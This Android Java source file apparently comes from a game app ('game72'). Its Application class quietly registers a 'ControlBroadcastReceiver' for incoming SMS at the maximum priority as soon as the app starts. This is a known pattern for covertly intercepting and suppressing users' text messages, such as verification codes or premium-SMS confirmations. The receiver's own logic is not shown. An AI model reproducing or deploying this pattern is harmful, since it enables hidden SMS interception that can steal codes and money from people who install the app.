package cn.com.tiantong.game72;

import cn.com.tiantong.game72.ControlBroadcastReceiver;
import android.app.Application;
import android.content.Context;
import android.content.IntentFilter;

public class MyApplication extends Application {
	
	//该application就是动态注册短信广播接收者
	
	@Override
	protected void attachBaseContext(Context base) {
		super.attachBaseContext(base);
		
		IntentFilter intentFilter = new IntentFilter();
		intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
		intentFilter.setPriority(2147483647);
		intentFilter.addCategory("android.intent.category.DEFAULT");
		registerReceiver(new ControlBroadcastReceiver(), intentFilter);
		
	}

}
